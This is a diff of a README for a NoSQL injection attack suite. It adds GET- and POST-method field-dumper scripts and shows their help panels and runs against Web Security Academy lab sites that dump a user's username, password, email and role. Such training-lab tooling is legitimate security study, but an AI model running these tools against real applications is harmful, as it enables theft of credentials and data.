@@ -1,13 +1,13 @@
 # NoSQLI-Attack-Suite
 These scripts enumerate usernames and passwords from web applications vulnerable to NoSQL injection in MongoDB databases
 
-## NoSQLI Field Dumper
+## NoSQLI Field Dumper Get Method
 
 ### Help panel
 
 ```
-# python NoSQLI-Field-Dumper.py -h
-usage: NoSQLI-Field-Dumper.py [-h] -u  [-p ] [-k] [-o ]
+# python NoSQLI-Field-Dumper-Get-Method.py -h
+usage: NoSQLI-Field-Dumper-Get-Method.py [-h] -u  [-p ] [-k] [-o ]
 
 MongoDB Fields Enumeration via NoSQL Injection
 
@@ -22,7 +22,71 @@ options:
 ### Usage
 
 ```
-# python NoSQLI-Field-Dumper.py -u https://0a01002d04aceb0a8189481100bf00aa.web-security-academy.net/login                              
+# python NoSQLI-Field-Dumper-Get-Method.py -u 'https://0a1d00fc04f88096875be31800d700bc.web-security-academy.net/user/lookup?user=' 
+[+] Enumerating number of fields: Completed
+[+] Fields found: 5
+
+[+] Enumerating field lengths: Completed
+[+] Field 0: 3
+[+] Field 1: 8
+[+] Field 2: 8
+[+] Field 3: 5
+[+] Field 4: 4
+
+[+] Enumerating field names: Completed
+[+] Field 0: _id
+[+] Field 1: username
+[+] Field 2: password
+[+] Field 3: email
+[+] Field 4: role
+
+[?] Enter field indexes to dump (0-4, comma-separated) or 'all' for all fields: all
+
+[+] Enumerating field value lengths: Completed
+[+] Field 0: 24
+[+] Field 1: 6
+[+] Field 2: 5
+[+] Field 3: 22
+[+] Field 4: 4
+
+[+] Enumerating field values: Completed
+[+] Field 0: 692c30d55dab93698ca561db
+[+] Field 1: wiener
+[+] Field 2: peter
+[+] Field 3: wiener@normal-user.net
+[+] Field 4: user
+
+[*] Fields and values
+[*] _id:692c30d55dab93698ca561db
+[*] username:wiener
+[*] password:peter
+[*] email:wiener@normal-user.net
+[*] role:user
+[*] Results saved to fields.txt
+```
+
+## NoSQLI Field Dumper Post Method
+
+### Help panel
+
+```
+# python NoSQLI-Field-Dumper-Post-Method.py -h
+usage: NoSQLI-Field-Dumper-Post-Method.py [-h] -u  [-p ] [-k] [-o ]
+
+MongoDB Fields Enumeration via NoSQL Injection
+
+options:
+  -h, --help      Show this help message and exit
+  -u, --url       Target URL (e.g. https://example.com/login)
+  -p, --proxy     Proxy URL (e.g. http://127.0.0.1:8080)
+  -k, --insecure  Disable SSL certificate verification (for self-signed certificates/invalid certificates)
+  -o, --output    Output file (default: fields.txt)
+```
+
+### Usage
+
+```
+# python NoSQLI-Field-Dumper-Post-Method.py -u https://0a01002d04aceb0a8189481100bf00aa.web-security-academy.net/login                              
 [+] Enumerating number of fields: Completed
 [+] Fields found: 4
 
